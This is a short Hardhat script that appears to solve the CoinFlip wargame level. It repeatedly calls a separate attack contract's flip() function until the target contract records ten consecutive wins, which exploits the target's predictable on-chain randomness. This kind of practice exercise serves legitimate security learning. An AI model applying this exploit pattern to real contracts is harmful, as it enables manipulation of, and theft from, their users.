import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0xf3eE3C4Ec25e8414838567818A30C90c7d62f834"
const PLAYER_ADDRESS = "0xBcd4042DE499D14e55001CcbB24a551F3b954096"
const ATTACK_ADDRESS = "0x5081a39b8A5f0E35a8D959395a630b68B74Dd30f"

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS)
  const contract = await ethers.getContractAt("CoinFlip", CONTRACT_ADDRESS, signer)
  const attackContract = await ethers.getContractAt("CoinFlipAttack", ATTACK_ADDRESS, signer)

  let wins = await contract.consecutiveWins()
  console.log(wins)

  while (await contract.consecutiveWins() < 10) {

    await attackContract.flip()

    wins = await contract.consecutiveWins()
    console.log(wins)

  }

  //await signer.sendTransaction({to: CONTRACT_ADDRESS, value: 0.00001 * 10**18})
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
